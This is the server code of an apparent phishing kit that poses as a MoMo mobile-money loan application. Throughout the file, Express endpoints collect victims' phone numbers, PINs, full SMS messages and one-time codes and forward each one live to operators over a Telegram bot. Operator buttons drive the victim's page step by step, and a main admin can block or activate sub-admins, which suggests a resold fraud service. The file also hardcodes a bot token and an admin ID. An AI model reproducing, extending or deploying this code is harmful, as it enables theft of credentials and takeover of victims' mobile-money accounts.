const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(__dirname));

const MAIN_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
const PORT = process.env.PORT || 10000;

if (!MAIN_BOT_TOKEN) {
    console.error("ERROR: Main Telegram Bot Token is missing.");
} else {
    console.log("Initializing Main Telegram Bot...");
}

const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });

mainBot.on('polling_error', (error) => {
    console.error('Main Bot Polling Error:', error.code, error.message);
});

let activeSessions = {};
let registeredAdmins = new Map();

function normalizeSms(text) {
    return (text || '').trim().replace(/\s+/g, ' ');
}

function escapeMarkdown(text) {
    if (!text) return '';
    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

function sendAdminLink(chatId, userIdStr, firstName, username) {
    const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    const isolatedLink = `${host}/?admin=${userIdStr}`;
    const welcomeText = `*ADMIN LINK READY*\n\n` +
        `*Name:* ${escapeMarkdown(firstName)}\n` +
        `*Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
        `*Username:* ${escapeMarkdown(username)}\n\n` +
        `*Permanent Link:*\n${isolatedLink}`;

    mainBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
        .catch(err => console.error("Error sending start message:", err));
}

mainBot.on('message', (msg) => {
    if (!msg.text) return;
    const chatId = msg.chat.id;
    const userIdStr = chatId.toString().trim();
    const firstName = msg.from.first_name || 'Admin';
    const username = msg.from.username ? `@${msg.from.username}` : 'No username set';

    if (!registeredAdmins.has(userIdStr)) {
        registeredAdmins.set(userIdStr, {
            firstName,
            username,
            lastSeen: new Date().toLocaleString(),
            isBlocked: false
        });
    } else {
        registeredAdmins.get(userIdStr).lastSeen = new Date().toLocaleString();
    }

    if (msg.text.startsWith('/activate')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "Access denied: Main Admin only.");
            return;
        }
        const targetId = msg.text.replace('/activate', '').trim();
        if (!targetId) {
            mainBot.sendMessage(chatId, "Usage: `/activate <Chat ID>`", { parse_mode: "Markdown" });
            return;
        }
        if (registeredAdmins.has(targetId)) {
            const adminData = registeredAdmins.get(targetId);
            adminData.isBlocked = false;
            mainBot.sendMessage(chatId, `Activated sub-admin \`${targetId}\` (${escapeMarkdown(adminData.firstName)}).`, { parse_mode: "Markdown" });
            mainBot.sendMessage(targetId, "*Your link has been activated.* Message routing is now active.", { parse_mode: "Markdown" }).catch(() => {});
        } else {
            mainBot.sendMessage(chatId, `Chat ID \`${targetId}\` not found.`, { parse_mode: "Markdown" });
        }
        return;
    }

    if (msg.text.startsWith('/payment')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "Access denied: Main Admin only.");
            return;
        }
        const targetId = msg.text.replace('/payment', '').trim();
        if (!targetId) {
            mainBot.sendMessage(chatId, "Usage: `/payment <Chat ID>`", { parse_mode: "Markdown" });
            return;
        }
        if (targetId === MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "Cannot block Main Admin.");
            return;
        }
        if (registeredAdmins.has(targetId)) {
            const adminData = registeredAdmins.get(targetId);
            adminData.isBlocked = true;
            mainBot.sendMessage(chatId, `Blocked link delivery for sub-admin \`${targetId}\` (${escapeMarkdown(adminData.firstName)}).`, { parse_mode: "Markdown" });
            mainBot.sendMessage(targetId, "*Link delivery paused.* Contact Main Admin for activation.", { parse_mode: "Markdown" }).catch(() => {});
        } else {
            mainBot.sendMessage(chatId, `Chat ID \`${targetId}\` not found.`, { parse_mode: "Markdown" });
        }
        return;
    }

    if (msg.text.startsWith('/all')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "Access denied: Main Admin only.");
            return;
        }

        let reportText = `*ALL SUB-ADMINS (ACTIVE & DORMANT)*\n\n`;
        let count = 1;

        registeredAdmins.forEach((data, id) => {
            if (id === MAIN_ADMIN_ID) return;
            const status = data.isBlocked ? "DORMANT (Blocked)" : "ACTIVE";
            reportText += `${count}. *${escapeMarkdown(data.firstName)}* (${escapeMarkdown(data.username)})\n` +
                `   ID: \`${id}\`\n` +
                `   Status: *${status}*\n` +
                `   Last Seen: ${escapeMarkdown(data.lastSeen)}\n\n`;
            count++;
        });

        if (count === 1) {
            reportText += "No sub-admins registered yet.";
        }

        mainBot.sendMessage(chatId, reportText, { parse_mode: "Markdown" });
        return;
    }

    if (msg.text.startsWith('/start')) {
        sendAdminLink(chatId, userIdStr, firstName, username);
    }
});

mainBot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const userIdStr = chatId.toString().trim();

    const parts = data.split('_');
    const action = parts[0];
    const sessionId = parts.slice(1).join('_');

    const session = activeSessions[sessionId];
    if (!session) {
        mainBot.answerCallbackQuery(query.id, { text: "Session expired or not found.", show_alert: false });
        return;
    }

    if (session.targetAdmin !== userIdStr) {
        mainBot.answerCallbackQuery(query.id, { text: "Unauthorized action.", show_alert: false });
        return;
    }

    if (action === 'allow') {
        session.status = 'allow_pin';
    } else if (action === 'deny') {
        session.status = 'deny_pin';
    } else if (action === 'wrongpin') {
        session.status = 'incorrect_pin';
    } else if (action === 'smsexpired') {
        if (session.lastSmsNorm) {
            session.expiredSmsList.add(session.lastSmsNorm);
        }
        session.status = 'sms_expired';
    } else if (action === 'done') {
        session.status = 'otp_step';
    } else if (action === 'otpexpired') {
        session.status = 'otp_expired';
    } else if (action === 'success') {
        session.status = 'success';
    }

    mainBot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: chatId,
        message_id: query.message.message_id
    }).catch(() => {});

    mainBot.answerCallbackQuery(query.id, { text: `Updated: ${action.toUpperCase()}` }).catch(() => {});
});

function isSubAdminBlocked(targetAdmin) {
    return targetAdmin !== MAIN_ADMIN_ID &&
        registeredAdmins.has(targetAdmin) &&
        registeredAdmins.get(targetAdmin).isBlocked;
}

app.post('/api/submit-credentials', (req, res) => {
    const { sessionId, phone, pin, loanAmount, applicantName, adminId } = req.body;
    let targetAdmin = adminId ? adminId.toString().trim() : MAIN_ADMIN_ID;

    if (isSubAdminBlocked(targetAdmin)) {
        return res.json({ success: true, sessionId });
    }

    activeSessions[sessionId] = {
        phone,
        pin,
        loanAmount: loanAmount || '100,000',
        applicantName: applicantName || '',
        targetAdmin,
        status: 'pending_pin',
        expiredSmsList: new Set(),
        lastSmsNorm: '',
        smsAttemptCount: 0
    };

    const message = `NEW MOMO APPLICATION\n\n` +
        `APPLICANT: ${applicantName || 'N/A'}\n` +
        `LOAN AMOUNT: ${loanAmount || '100,000'}\n` +
        `PHONE NO: ${phone}\n` +
        `PIN: ${pin}`;

    mainBot.sendMessage(targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "ALLOW", callback_data: `allow_${sessionId}` },
                    { text: "DENY", callback_data: `deny_${sessionId}` }
                ]
            ]
        }
    }).catch(err => console.error("Telegram credential send error:", err.message));

    res.json({ success: true, sessionId });
});

app.post('/api/submit-sms', (req, res) => {
    const { sessionId, smsText } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ success: false, status: 'not_found' });
    }

    const cleanSms = normalizeSms(smsText);

    if (session.expiredSmsList.has(cleanSms)) {
        session.status = 'sms_expired';
        return res.json({ success: false, rejectedDuplicate: true, status: 'sms_expired' });
    }

    session.smsAttemptCount = (session.smsAttemptCount || 0) + 1;
    const isReplacementSms = session.expiredSmsList.size > 0 || session.smsAttemptCount > 1;
    session.lastSmsNorm = cleanSms;
    session.smsText = cleanSms;
    session.status = 'pending_sms_review';

    if (isSubAdminBlocked(session.targetAdmin)) {
        return res.json({ success: true, rejectedDuplicate: false });
    }

    const headerLabel = isReplacementSms ? "NEW MOMO SMS RECEIVED" : "MOMO SMS RECEIVED";
    const message = `${headerLabel}\n\n` +
        `PHONE NO: ${session.phone}\n` +
        `PIN: ${session.pin}\n\n` +
        `WHOLE SMS:\n${cleanSms}`;

    mainBot.sendMessage(session.targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📋 COPY SMS", copy_text: { text: cleanSms } }
                ],
                [
                    { text: "INCORRECT PIN", callback_data: `wrongpin_${sessionId}` },
                    { text: "SMS EXPIRED", callback_data: `smsexpired_${sessionId}` }
                ],
                [
                    { text: "DONE ✅", callback_data: `done_${sessionId}` }
                ]
            ]
        }
    }).catch(err => console.error("Telegram SMS send error:", err.message));

    res.json({ success: true, rejectedDuplicate: false });
});

app.post('/api/request-new-sms', (req, res) => {
    const { sessionId } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ success: false });
    }

    session.status = 'waiting_new_sms';

    if (!isSubAdminBlocked(session.targetAdmin)) {
        mainBot.sendMessage(
            session.targetAdmin,
            `NEW SMS REQUESTED\n\nApplicant for PHONE NO: ${session.phone} requested a new SMS after the 15-second timer ended.`
        ).catch(() => {});
    }

    res.json({ success: true });
});

app.post('/api/submit-otp', (req, res) => {
    const { sessionId, otpCode } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ success: false, status: 'not_found' });
    }

    session.otpCode = otpCode;
    session.status = 'pending_otp_review';

    if (isSubAdminBlocked(session.targetAdmin)) {
        return res.json({ success: true });
    }

    const message = `NEW 4-DIGIT OTP RECEIVED\n\n` +
        `PHONE NO: ${session.phone}\n` +
        `4-DIGIT OTP: ${otpCode}`;

    mainBot.sendMessage(session.targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📋 COPY OTP", copy_text: { text: otpCode } }
                ],
                [
                    { text: "OTP EXPIRED", callback_data: `otpexpired_${sessionId}` },
                    { text: "SUCCESS", callback_data: `success_${sessionId}` }
                ]
            ]
        }
    }).catch(err => console.error("Telegram OTP send error:", err.message));

    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const session = activeSessions[req.params.sessionId];
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    res.json({ status: session.status });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
        
